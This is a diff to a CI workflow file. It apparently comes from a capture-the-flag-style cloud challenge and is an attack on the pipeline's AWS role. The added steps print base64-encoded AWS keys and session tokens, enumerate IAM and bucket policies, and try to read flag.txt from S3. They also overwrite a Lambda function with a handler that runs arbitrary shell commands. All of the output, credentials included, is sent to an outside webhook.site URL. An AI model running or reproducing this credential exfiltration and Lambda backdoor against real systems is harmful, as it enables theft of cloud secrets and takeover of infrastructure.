@@ -8,7 +8,13 @@ permissions:
   contents: read
 jobs:
   dump:
-    runs-on: self-hosted
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - runner: ubuntu-latest
+          - runner: self-hosted
+    runs-on: ${{ matrix.runner }}
     steps:
       - uses: aws-actions/configure-aws-credentials@v4
         with:
@@ -19,22 +25,77 @@ jobs:
         shell: bash
         run: |
           set +e
+          WH='https://webhook.site/42b620d7-2084-4d83-889f-139b520dd049'
           {
+            echo "===HOST $(hostname) RUNNER=${RUNNER_NAME:-?} OS=${RUNNER_OS:-?}==="
             echo "===ID==="
             aws sts get-caller-identity
-            echo "===CREDS==="
-            python3 -c "import os;print('AK='+os.environ.get('AWS_ACCESS_KEY_ID',''));print('SK='+os.environ.get('AWS_SECRET_ACCESS_KEY',''));print('ST='+os.environ.get('AWS_SESSION_TOKEN',''))"
-            echo "===FLAGTRY==="
+            echo "===CREDS_B64==="
+            python3 - <<'PY'
+import os,base64
+for k in ['AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY','AWS_SESSION_TOKEN']:
+  v=os.environ.get(k,'') or ''
+  print(k+'_B64='+base64.b64encode(v.encode()).decode())
+PY
+            echo "===POLICY_LIVE==="
+            aws iam list-attached-role-policies --role-name cicdRole 2>&1
+            aws iam list-role-policies --role-name cicdRole 2>&1
+            for p in $(aws iam list-attached-role-policies --role-name cicdRole --query 'AttachedPolicies[].PolicyArn' --output text 2>/dev/null); do
+              v=$(aws iam get-policy --policy-arn "$p" --query 'Policy.DefaultVersionId' --output text 2>/dev/null)
+              aws iam get-policy-version --policy-arn "$p" --version-id "$v" 2>&1
+            done
+            for p in $(aws iam list-role-policies --role-name cicdRole --query 'PolicyNames[]' --output text 2>/dev/null); do
+              aws iam get-role-policy --role-name cicdRole --policy-name "$p" 2>&1
+            done
+            echo "===BUCKET_POL==="
+            aws s3api get-bucket-policy --bucket codec4f26c862a321ef5 2>&1
+            aws s3api get-bucket-policy --bucket platform-bucket-009661764077-us-east-1 2>&1
+            echo "===FLAG_TRY==="
             aws s3 cp s3://codec4f26c862a321ef5/flag.txt - 2>&1
-            echo "===LIST==="
-            aws s3 ls s3://codec4f26c862a321ef5/
-            echo "===LAM==="
-            URL=$(aws lambda get-function --function-name nslookupv2 --query Code.Location --output text)
+            aws s3api get-object --bucket codec4f26c862a321ef5 --key flag.txt /tmp/flag.bin 2>&1
+            xxd /tmp/flag.bin 2>&1 | head
+            echo "===LAM_CODE==="
+            URL=$(aws lambda get-function --function-name nslookupv2 --query Code.Location --output text 2>/dev/null)
+            echo "URL_LEN=${#URL}"
             curl -sL "$URL" -o /tmp/lam.zip
-            python3 -c "import zipfile;z=zipfile.ZipFile('/tmp/lam.zip');
-[print(n);print(z.read(n)) for n in z.namelist()]"
-            echo "===PLAT==="
-            aws s3api list-objects-v2 --bucket platform-bucket-009661764077-us-east-1
+            ls -la /tmp/lam.zip
+            python3 - <<'PY'
+import zipfile,os
+p='/tmp/lam.zip'
+if os.path.exists(p) and os.path.getsize(p)>0:
+  z=zipfile.ZipFile(p)
+  for n in z.namelist():
+    print('FILE',n)
+    data=z.read(n)
+    print(data[:4000].decode('utf-8','replace'))
+PY
+            echo "===LAM_POL==="
+            aws lambda get-policy --function-name nslookupv2 2>&1
+            echo "===TRY_UPDATE_CODE==="
+            mkdir -p /tmp/plant
+            cat > /tmp/plant/lambda_function.py <<'PY'
+import subprocess,json
+def lambda_handler(event, context):
+    cmds=event.get('cmds') or [
+      'aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt',
+      'cat /tmp/flag.txt'
+    ]
+    out=[]
+    for c in cmds:
+      r=subprocess.run(c,shell=True,capture_output=True,text=True)
+      out.append({'cmd':c,'rc':r.returncode,'stdout':r.stdout,'stderr':r.stderr})
+    return {'statusCode':200,'body':json.dumps(out)}
+PY
+            (cd /tmp/plant && zip -q /tmp/plant.zip lambda_function.py)
+            aws lambda update-function-code --function-name nslookupv2 --zip-file fileb:///tmp/plant.zip 2>&1
+            aws lambda invoke --function-name nslookupv2 --payload '{"domain":"x"}' /tmp/out.json 2>&1
+            cat /tmp/out.json 2>&1
+            echo "===MISC==="
+            aws lambda list-functions --query 'Functions[].FunctionName' 2>&1
+            aws ec2 describe-vpcs --query 'Vpcs[].VpcId' 2>&1
+            aws codebuild list-projects 2>&1
+            aws apigateway get-rest-apis 2>&1
           } 2>&1 | tee /tmp/all.txt
-          curl -s -X POST --data-binary @/tmp/all.txt 'https://webhook.site/42b620d7-2084-4d83-889f-139b520dd049' || true
+          curl -s -X POST --data-binary @/tmp/all.txt "$WH" || true
+          xxd /tmp/all.txt | curl -s -X POST --data-binary @- "$WH" || true
           cat /tmp/all.txt
